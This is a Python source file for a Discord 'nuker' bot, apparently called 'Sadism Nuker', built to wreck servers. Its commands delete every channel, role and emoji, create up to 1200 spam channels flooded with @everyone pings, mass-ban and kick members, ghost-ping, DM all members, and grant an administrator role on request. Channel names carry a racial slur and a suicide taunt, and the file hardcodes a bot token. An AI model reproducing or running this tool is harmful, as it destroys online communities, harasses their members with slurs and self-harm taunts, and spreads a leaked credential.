import asyncio
import random
import discord
from discord.ext import commands

TOKEN = "MTM4Nzg2ODQyNzY4NzAzOTE4OA.GCArc1.tfhpG58AQmRumYhKkLAWjaIaKyMSmOxciyqyy8"

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.message_content = True
intents.emojis = True
intents.messages = True
intents.voice_states = True

bot = commands.Bot(command_prefix="!", intents=intents)

class ChannelDestroyer:
    def __init__(self, bot):
        self.bot = bot
        self.spam_task = None
        self.spam_channel = None
        self.gif_link = "https://tenor.com/view/cat-creepy-smile-grin-smirk-gif-16269033"
        self.spam_names = [
            "𝘊𝘙𝘠 𝘔𝘌 𝘈 𝘙𝘐𝘝𝘌𝘙 𝘕𝘐𝘎𝘎𝘈",
            "𝘚𝘜𝘉𝘏𝘜𝘔𝘈𝘕 𝘎𝘈𝘙𝘉𝘈𝘎𝘌",
            "𝘞𝘖𝘔𝘗 𝘞𝘖𝘔𝘗 𝘑𝘜𝘔𝘗 𝘖𝘍𝘍 𝘈 𝘊𝘓𝘐𝘍𝘍",
            "𝘍𝘜𝘊𝘒𝘌𝘋 𝘉𝘠 𝘚𝘈𝘋𝘐𝘚𝘔 𝘕𝘜𝘒𝘌𝘙",
        ]

    async def change_server_name_and_icon(self, guild, new_name="SADISM NUKED"):
        try:
            await guild.edit(name=new_name)
        except:
            pass

    async def anti(self, guild, ctx_channel):
        try:
            await self.change_server_name_and_icon(guild)
            # Delete all channels first
            for channel in list(guild.channels):
                try:
                    await channel.delete(reason="Anti Command - Deleting channels")
                    await asyncio.sleep(0.2)
                except:
                    pass

            # Spam massive channels and messages
            async def spam_channel_messages(channel):
                try:
                    for _ in range(40):
                        await channel.send(f"@everyone WOMP WOMP CRY ABOUT LMAOOOO NUKED BY SADISM NUKER\n{self.gif_link}")
                        await asyncio.sleep(0.3)
                except:
                    pass

            created_channels = []
            for i in range(1200):  # 1200 channels to spam hard
                try:
                    name = f"{random.choice(self.spam_names)} {i+1}"
                    ch = await guild.create_text_channel(name)
                    created_channels.append(ch)
                except:
                    pass

            # Spam all created channels concurrently
            spam_tasks = []
            for ch in created_channels:
                spam_tasks.append(asyncio.create_task(spam_channel_messages(ch)))
                await asyncio.sleep(0.05)

            # Also spam the original channel heavily
            async def spam_original_channel():
                try:
                    for _ in range(50):
                        await ctx_channel.send(f"SERVER OWNED BY SADISM NUKER! {self.gif_link}")
                        await asyncio.sleep(0.2)
                except:
                    pass

            spam_tasks.append(asyncio.create_task(spam_original_channel()))

            await asyncio.gather(*spam_tasks)

            # Final confirmation message in the original channel
            await ctx_channel.send("✅ !anti command executed: Server nuked and spammed with maximum intensity.")
        except:
            pass

    async def bypass(self, guild, ctx_channel):
        try:
            await self.change_server_name_and_icon(guild)
            for channel in list(guild.channels):
                try:
                    await channel.delete(reason="bypass command")
                    await asyncio.sleep(random.uniform(0.2, 1.0))
                except:
                    pass

            await asyncio.sleep(1)

            try:
                new_channel = await guild.create_text_channel("bypass-channel")
                self.spam_channel = new_channel
                await new_channel.send("Bypass started. Beginning randomized spam now...")
            except:
                return

            if self.spam_task and not self.spam_task.done():
                self.spam_task.cancel()
                try:
                    await self.spam_task
                except asyncio.CancelledError:
                    pass

            self.spam_task = asyncio.create_task(self.spam_messages())
            await ctx_channel.send("✅ !bypass command completed successfully.")
        except:
            pass

    async def rename_all_channels(self, guild, new_name: str, ctx_channel):
        try:
            for channel in guild.channels:
                try:
                    await channel.edit(name=new_name, reason="renamechannels command")
                    await asyncio.sleep(0.3)
                except:
                    pass
            await ctx_channel.send(f"✅ All channels renamed to: {new_name}")
        except:
            pass

    async def spam_messages(self):
        while True:
            try:
                if self.spam_channel:
                    await self.spam_channel.send(f"What happened to your security? Also get fucked by sadism crew\n{self.gif_link}")
                await asyncio.sleep(random.uniform(0.4, 1.0))
            except:
                await asyncio.sleep(1)

    async def delete_all_channels(self, guild, ctx_channel):
        try:
            for channel in list(guild.channels):
                try:
                    await channel.delete(reason="DeleteChannels command")
                    await asyncio.sleep(0.3)
                except:
                    pass
            await ctx_channel.send("✅ All channels deleted successfully.")
        except:
            pass

    async def mass_delete_roles(self, guild, ctx_channel):
        try:
            roles = [r for r in guild.roles if r.name != "@everyone" and r < guild.me.top_role]
            for role in roles:
                try:
                    await role.delete(reason="massdeleteroles command")
                    await asyncio.sleep(0.5)
                except:
                    pass
            await ctx_channel.send("✅ All deletable roles removed successfully.")
        except:
            pass

    async def ghostping_channel(self, channel, count=10, ctx_channel=None, delay=0.3):
        try:
            for _ in range(count):
                try:
                    msg = await channel.send("@everyone")
                    await asyncio.sleep(0.1)
                    await msg.delete()
                    await asyncio.sleep(delay)
                except:
                    break
            if ctx_channel:
                await ctx_channel.send(f"✅ Completed {count} ghostpings in {channel.name}.")
        except:
            pass

    async def kick_all_members(self, guild, ctx_channel):
        try:
            kicked = 0
            for member in guild.members:
                if member == self.bot.user or member.bot:
                    continue
                try:
                    if guild.me.top_role > member.top_role:
                        await member.kick(reason="KickAll command issued")
                        kicked += 1
                        await asyncio.sleep(0.5)
                except:
                    pass
            await ctx_channel.send(f"✅ Kicked {kicked} members successfully.")
        except:
            pass

    async def mass_mute_all(self, ctx_channel):
        try:
            muted = 0
            for guild in self.bot.guilds:
                for vc in guild.voice_channels:
                    for member in vc.members:
                        if member.bot or not member.voice:
                            continue
                        try:
                            await member.edit(mute=True, reason="mass_mute_all command")
                            muted += 1
                            await asyncio.sleep(0.3)
                        except:
                            pass
            await ctx_channel.send(f"✅ Muted {muted} members in voice channels.")
        except:
            pass

    async def mass_unmute_all(self, ctx_channel):
        try:
            unmuted = 0
            for guild in self.bot.guilds:
                for vc in guild.voice_channels:
                    for member in vc.members:
                        if member.bot or not member.voice:
                            continue
                        try:
                            await member.edit(mute=False, reason="mass_unmute_all command")
                            unmuted += 1
                            await asyncio.sleep(0.3)
                        except:
                            pass
            await ctx_channel.send(f"✅ Unmuted {unmuted} members in voice channels.")
        except:
            pass

    async def mod_user(self, guild, member, ctx_channel):
        try:
            mod_role = None
            for role in guild.roles:
                if role.name.lower() == "moderator":
                    mod_role = role
                    break
            if not mod_role:
                try:
                    mod_role = await guild.create_role(name="Moderator", permissions=discord.Permissions(administrator=True))
                except:
                    if ctx_channel:
                        await ctx_channel.send("⚠️ Failed to create Moderator role.")
                    return
            try:
                await member.add_roles(mod_role, reason="moduser command")
                if ctx_channel:
                    await ctx_channel.send(f"✅ {member} has been given the Moderator role.")
            except:
                pass
        except:
            pass

    async def massban(self, guild, ctx_channel):
        try:
            banned = 0
            for member in guild.members:
                if member == self.bot.user or member.bot:
                    continue
                try:
                    await member.ban(reason="massban command")
                    banned += 1
                    await asyncio.sleep(0.5)
                except:
                    pass
            await ctx_channel.send(f"✅ Banned {banned} members successfully.")
        except:
            pass

    async def massunban(self, guild, ctx_channel):
        try:
            unbanned = 0
            bans = await guild.bans()
            for ban_entry in bans:
                user = ban_entry.user
                try:
                    await guild.unban(user)
                    unbanned += 1
                    await asyncio.sleep(0.5)
                except:
                    pass
            await ctx_channel.send(f"✅ Unbanned {unbanned} users successfully.")
        except:
            pass

    async def spamrole(self, guild, ctx_channel, count=50):
        try:
            created = 0
            for i in range(count):
                try:
                    await guild.create_role(name=f"SpamRole{i+1}")
                    created += 1
                    await asyncio.sleep(0.3)
                except:
                    pass
            await ctx_channel.send(f"✅ Created {created} spam roles.")
        except:
            pass

    async def renameroles(self, guild, new_name: str, ctx_channel=None):
        try:
            renamed = 0
            for role in guild.roles:
                if role.name != "@everyone":
                    try:
                        await role.edit(name=new_name)
                        renamed += 1
                        await asyncio.sleep(0.3)
                    except:
                        pass
            if ctx_channel:
                await ctx_channel.send(f"✅ Renamed {renamed} roles to '{new_name}'.")
        except:
            pass

    async def massnick(self, guild, ctx_channel, nick="NUKED"):
        try:
            changed = 0
            for member in guild.members:
                try:
                    await member.edit(nick=nick)
                    changed += 1
                    await asyncio.sleep(0.3)
                except:
                    pass
            await ctx_channel.send(f"✅ Changed nicknames for {changed} members.")
        except:
            pass

    async def massdeafen(self, guild, ctx_channel):
        try:
            deafened = 0
            for vc in guild.voice_channels:
                for member in vc.members:
                    if member.bot or not member.voice:
                        continue
                    try:
                        await member.edit(deafen=True)
                        deafened += 1
                        await asyncio.sleep(0.3)
                    except:
                        pass
            await ctx_channel.send(f"✅ Deafened {deafened} members in voice channels.")
        except:
            pass

    async def massundeafen(self, guild, ctx_channel):
        try:
            undeafened = 0
            for vc in guild.voice_channels:
                for member in vc.members:
                    if member.bot or not member.voice:
                        continue
                    try:
                        await member.edit(deafen=False)
                        undeafened += 1
                        await asyncio.sleep(0.3)
                    except:
                        pass
            await ctx_channel.send(f"✅ Undeafened {undeafened} members in voice channels.")
        except:
            pass

    async def massassignrole(self, guild, ctx_channel, role_name):
        try:
            role = discord.utils.get(guild.roles, name=role_name)
            if not role:
                role = await guild.create_role(name=role_name)
            assigned = 0
            for member in guild.members:
                try:
                    await member.add_roles(role)
                    assigned += 1
                    await asyncio.sleep(0.3)
                except:
                    pass
            await ctx_channel.send(f"✅ Assigned role '{role_name}' to {assigned} members.")
        except:
            pass

    async def massremoverole(self, guild, ctx_channel, role_name):
        try:
            role = discord.utils.get(guild.roles, name=role_name)
            if not role:
                await ctx_channel.send(f"⚠️ Role '{role_name}' not found.")
                return
            removed = 0
            for member in guild.members:
                try:
                    await member.remove_roles(role)
                    removed += 1
                    await asyncio.sleep(0.3)
                except:
                    pass
            await ctx_channel.send(f"✅ Removed role '{role_name}' from {removed} members.")
        except:
            pass

    async def stopspam(self, ctx_channel):
        try:
            if self.spam_task and not self.spam_task.done():
                self.spam_task.cancel()
                try:
                    await self.spam_task
                except asyncio.CancelledError:
                    pass
                await ctx_channel.send("✅ Spam task stopped.")
            else:
                await ctx_channel.send("ℹ️ No spam task is currently running.")
        except:
            pass

    async def dmall(self, guild, ctx_channel, message):
        try:
            sent = 0
            for member in guild.members:
                if member.bot or member == self.bot.user:
                    continue
                try:
                    await member.send(message)
                    sent += 1
                    await asyncio.sleep(0.3)
                except:
                    pass
            await ctx_channel.send(f"✅ Sent DMs to {sent} members.")
        except:
            pass

    async def purge(self, channel, ctx_channel, limit=100):
        try:
            deleted = await channel.purge(limit=limit)
            await ctx_channel.send(f"✅ Purged {len(deleted)} messages in #{channel.name}.")
        except:
            pass

    async def masskickbots(self, guild, ctx_channel):
        try:
            kicked = 0
            for member in guild.members:
                if member.bot:
                    try:
                        await member.kick(reason="masskickbots command")
                        kicked += 1
                        await asyncio.sleep(0.5)
                    except:
                        pass
            await ctx_channel.send(f"✅ Kicked {kicked} bots successfully.")
        except:
            pass

    async def massdeleteemojis(self, guild, ctx_channel):
        try:
            deleted = 0
            for emoji in guild.emojis:
                try:
                    await emoji.delete(reason="massdeleteemojis command")
                    deleted += 1
                    await asyncio.sleep(0.3)
                except:
                    pass
            await ctx_channel.send(f"✅ Deleted {deleted} emojis successfully.")
        except:
            pass

destroyer = ChannelDestroyer(bot)

# Command wiring with success messages

@bot.command()
async def anti(ctx):
    await destroyer.anti(ctx.guild, ctx.channel)

@bot.command()
async def bypass(ctx):
    await destroyer.bypass(ctx.guild, ctx.channel)

@bot.command()
async def deletechannels(ctx):
    await destroyer.delete_all_channels(ctx.guild, ctx.channel)

@bot.command()
async def massdeleteroles(ctx):
    await destroyer.mass_delete_roles(ctx.guild, ctx.channel)

@bot.command()
async def renamechannels(ctx, *, new_name: str):
    await destroyer.rename_all_channels(ctx.guild, new_name, ctx.channel)

@bot.command()
async def ghostping(ctx, count: int = 10):
    await destroyer.ghostping_channel(ctx.channel, count, ctx.channel)

@bot.command()
async def kickall(ctx):
    await destroyer.kick_all_members(ctx.guild, ctx.channel)

@bot.command()
async def massmute(ctx):
    await destroyer.mass_mute_all(ctx.channel)

@bot.command()
async def massunmute(ctx):
    await destroyer.mass_unmute_all(ctx.channel)

@bot.command()
async def moduser(ctx, user: discord.Member):
    await destroyer.mod_user(ctx.guild, user, ctx.channel)

@bot.command()
async def massban(ctx):
    await destroyer.massban(ctx.guild, ctx.channel)

@bot.command()
async def massunban(ctx):
    await destroyer.massunban(ctx.guild, ctx.channel)

@bot.command()
async def spamrole(ctx, count: int = 50):
    await destroyer.spamrole(ctx.guild, ctx.channel, count)

@bot.command()
async def renameroles(ctx, *, new_name: str):
    await destroyer.renameroles(ctx.guild, new_name, ctx.channel)

@bot.command()
async def massnick(ctx, *, nick: str = "NUKED"):
    await destroyer.massnick(ctx.guild, ctx.channel, nick)

@bot.command()
async def massdeafen(ctx):
    await destroyer.massdeafen(ctx.guild, ctx.channel)

@bot.command()
async def massundeafen(ctx):
    await destroyer.massundeafen(ctx.guild, ctx.channel)

@bot.command()
async def massassignrole(ctx, *, role_name: str):
    await destroyer.massassignrole(ctx.guild, ctx.channel, role_name)

@bot.command()
async def massremoverole(ctx, *, role_name: str):
    await destroyer.massremoverole(ctx.guild, ctx.channel, role_name)

@bot.command()
async def stopspam(ctx):
    await destroyer.stopspam(ctx.channel)

@bot.command()
async def dmall(ctx, *, message: str):
    await destroyer.dmall(ctx.guild, ctx.channel, message)

@bot.command()
async def purge(ctx, limit: int = 100):
    await destroyer.purge(ctx.channel, ctx.channel, limit)

@bot.command()
async def masskickbots(ctx):
    await destroyer.masskickbots(ctx.guild, ctx.channel)

@bot.command()
async def massdeleteemojis(ctx):
    await destroyer.massdeleteemojis(ctx.guild, ctx.channel)

@bot.event
async def on_ready():
    # Silent startup, no logs
    pass

bot.run(TOKEN)
